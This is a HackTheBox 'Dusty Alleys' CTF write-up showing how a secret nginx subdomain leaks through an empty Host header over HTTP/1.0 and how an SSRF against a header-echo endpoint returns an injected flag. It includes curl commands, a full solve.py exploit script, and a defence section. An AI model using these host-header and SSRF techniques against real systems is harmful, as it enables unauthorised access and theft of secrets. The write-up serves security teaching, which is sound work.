---
title: "Dusty Alleys"
date: 2027-12-21 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, ssrf, header-reflection, virtual-host, host-header, nginx, cwe-918, cwe-200]
description: "A medium Web challenge where the flag never appears in any response body — it rides an outbound request header the server injects. Leak a 'secret' nginx virtual host with an empty Host over HTTP/1.0, then SSRF the guardian route at the app's own header-echo endpoint to read the flag back out of the injected Key header."
---

## Overview

`Dusty Alleys` is a medium HackTheBox **Web** challenge — a small Node/Express + EJS app
sitting behind nginx. The flag is never in any page's body; the server attaches it as a
`Key` header on an outbound request it makes on your behalf. The path chains two weaknesses:
a [secret virtual-host disclosure](https://cwe.mitre.org/data/definitions/200.html) that
hands you an "unguessable" subdomain, and a
[server-side request forgery](https://cwe.mitre.org/data/definitions/918.html) that points
the app at its own header-reflecting endpoint so the injected flag comes right back.

## The technique

Three routes run on the Node process (`:1337`):

- `GET /think` — reflects every request header back as JSON (`res.json(req.headers)`).
- `GET /guardian` — takes a `quote` URL, checks its hostname ends with `localhost`, then
  fetches it **with the flag attached as a header**:

```js
let result = await node_fetch(quote, {
  method: "GET",
  headers: { Key: process.env.FLAG },
}).then((res) => res.text());
res.send(result);
```

nginx splits the app across two name-based virtual hosts keyed on a secret env `SECRET_ALLEY`:

```nginx
server { listen 80 default_server; server_name alley.$SECRET_ALLEY;
  location /think { proxy_pass http://localhost:1337; proxy_set_header Host $host; } }
server { listen 80; server_name guardian.$SECRET_ALLEY;
  location /guardian { proxy_pass http://localhost:1337; } }
```

Hitting the box by IP lands on the default `alley.` vhost, so `/guardian` 404s. You cannot
reach the vulnerable route until you know the secret subdomain — and the flag is a header the
`endsWith("localhost")` guard never inspects.

## Solution

**Step 1 — leak `SECRET_ALLEY` with an empty Host over HTTP/1.0.**

nginx sets `proxy_set_header Host $host`. Under HTTP/1.0 the Host header is optional; send the
request with **no Host**, and nginx falls back to the matched (default) server's `server_name`
for `$host`. `/think` reflects that straight back:

```bash
curl -s --http1.0 -H "Host:" "http://<ip:port>/think"
# {"host":"alley.firstalleyontheleft.com", ...}
```

HTTP/1.1 rejects an empty Host with `400`, so this **must** be HTTP/1.0. Strip the `alley.`
prefix → `SECRET_ALLEY = firstalleyontheleft.com`.

**Step 2 — SSRF the guardian route at the app's own `/think`.**

Forge the Host to reach the `guardian.` vhost, and point `quote` at `http://localhost:1337/think`.
The hostname is `localhost` (passes the check), the guardian attaches `Key: <FLAG>`, and `/think`
echoes it right back:

```bash
curl -s -H "Host: guardian.firstalleyontheleft.com" \
     "http://<ip:port>/guardian?quote=http://localhost:1337/think"
# {"key":"HTB{...}", ...}
```

The full solve, self-contained (raw-socket HTTP/1.0 leak + the SSRF request):

Create `solve.py`:

```python
import re, sys, socket, json, requests
TARGET = sys.argv[1]
host, port = TARGET.split(":"); port = int(port)

req = "GET /think HTTP/1.0\r\nConnection: close\r\n\r\n"
s = socket.create_connection((host, port), timeout=10); s.sendall(req.encode())
buf = b""
while (d := s.recv(4096)): buf += d
body = buf.split(b"\r\n\r\n", 1)[1].decode()
secret = re.sub(r"^alley\.", "", json.loads(body)["host"])
print("[+] SECRET_ALLEY =", secret)

r = requests.get(f"http://{TARGET}/guardian",
                 params={"quote": "http://localhost:1337/think"},
                 headers={"Host": f"guardian.{secret}"})
print("[+] FLAG =", r.json()["key"])
```

```bash
python3 solve.py <ip:port>
# [+] SECRET_ALLEY = firstalleyontheleft.com
# [+] FLAG = HTB{...}
```

## Why it worked

Two design mistakes stack. First, nginx `$host` falls back to the block's `server_name` when
no Host is sent, so a "secret" subdomain used as access control leaks through a header-echo
endpoint — a subdomain is never a secret. Second, the SSRF guard checks only *where* the fetch
goes (`endsWith("localhost")`), never *what header it carries*, and the flag is injected as a
header on that outbound request. Pointing the fetch at an internal endpoint that reflects
`req.headers` turns the app into an oracle for its own injected secret. The flag is never in a
response body — it rides a request header the server adds itself.

## Fix / defense

- Never place a secret (flag, API key, token) in a header on a request whose destination the
  attacker controls. If a downstream call must be authenticated, pin the exact URL server-side.
- Don't reflect raw `req.headers`. Whitelist headers if you must echo anything, and never echo
  auth headers.
- Don't treat a subdomain as a secret — `server_name` leaks via `$host` fallback, TLS SNI,
  certificate transparency, and error pages. Gate access with real authentication.
- Validate SSRF targets against an allowlist of full URLs, not a hostname suffix
  (`endsWith("localhost")` also allows `evil-localhost` and `x.localhost`).
